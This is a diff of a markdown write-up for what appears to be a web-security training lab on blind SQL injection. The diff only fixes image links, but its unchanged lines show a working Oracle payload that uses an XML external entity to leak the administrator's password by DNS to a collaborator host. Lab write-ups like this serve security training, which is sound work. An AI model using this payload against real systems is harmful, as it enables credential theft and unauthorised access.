@@ -48,17 +48,17 @@ abc123.burpcollaborator.net
 
 ## Step 3: Exfiltrate Data via DNS
 
-[screen](images/lab17_0.png)
+![screen](images/lab17_0.png)
 
 ### Payload (Oracle):
 x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ufd5znsr7ssgo3ux9mv9lpfk9bf53vrk.oastify.com/"> %remote;]>'),'/l') FROM dual)--
 
-[screen](images/lab17_2.png)
+![screen](images/lab17_2.png)
 
 
-[screen](images/lab17_3.png)
+![screen](images/lab17_3.png)
 
-[screen](images/lab17_4.png)
+![screen](images/lab17_4.png)
 
 
 ---
@@ -87,7 +87,7 @@ x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYP
 
  Lab solved
 
-[screen](images/lab17_5.png)
+![screen](images/lab17_5.png)
 
 ---
 
